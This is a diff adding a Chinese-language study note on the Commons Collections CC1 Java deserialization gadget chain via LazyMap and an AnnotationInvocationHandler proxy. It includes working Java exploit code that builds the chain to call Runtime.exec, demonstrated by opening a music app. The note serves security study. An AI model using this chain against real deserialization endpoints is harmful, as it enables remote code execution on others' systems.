@@ -241,3 +241,74 @@ public class CC1Test1 {
 ![image-20250217223428712](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217223428827.png)
 
 
+## CC1-2
+
+反序列化方法deserialize->AnnotationInvocationHandler.readobject()->Proxy(annotationInvocationHandler).xxx（invoke）->LazyMap.get()->transform()
+
+LazyMap.get()中调用了transform方法
+
+![image-20250218104231354](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218104231397.png)
+
+factory可控，在构造函数中被赋值，构造函数为protected，所以用decorate方法来调用构造方法
+
+![image-20250218104441772](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218104441814.png)
+
+配合CC1第一条链部分，利用LazyMap的get方法去调用transform来实现，成功弹出
+
+![image-20250218153948893](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218153948980.png)
+
+```java
+ Transformer[] transformers = new Transformer[]{
+                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/NeteaseMusic.app"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap<Object, Object> map = new HashMap<>();
+        Map<Object, Object> decorate = LazyMap.decorate(map, chainedTransformer);
+        decorate.get(Runtime.class);
+```
+
+我们要找从readobject方法走到LazyMap的get方法的调用流程，但是未找到readObject方法直接调用它
+
+然后我们发现AnnotationInvocationHandler的invoke方法调用了get方法
+
+![image-20250218144625646](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218144625775.png)
+
+且memberValues可控，在构造函数里被赋值
+
+![image-20250218144658629](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218144658712.png)
+
+AnnotationInvocationHandler的readObject方法里调用了memeberValues的entryset()方法
+
+![image-20250218152844772](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218152844906.png)
+
+初始化一个AnnotationInvocationHandler对象，利用代理类，创建一个map代理实例，在readObject中，走到memeberValues的entryset()方法时，会触发代理机制，进入invoke方法，在初始化时，把memberValues赋值为LazyMap，走到LazyMap.get方法，从而执行命令
+
+```java
+Transformer[] transformers = new Transformer[]{
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
+        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/NeteaseMusic.app"})
+};
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+HashMap<Object, Object> map = new HashMap<>();
+Map<Object, Object> decorate = LazyMap.decorate(map, chainedTransformer);
+Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+
+Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, decorate);
+Map newMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler);
+Object o = constructor.newInstance(Target.class, newMap);
+serialize(o);
+unserialize("ser.bin");
+```
+
+![image-20250218154940022](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218154940156.png)
+
+Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler);//创建了一个实现了 `Map` 接口的代理对象。动态代理可以在运行时创建对象，并且拦截对该对象的所有方法调用。
+
+AnnotationInvocationHandler的readObject方法中执行了memberValues.entrySet()，memberValues被赋值为LazyMap（调用了map对象的方法）从而触发了invoke方法
+
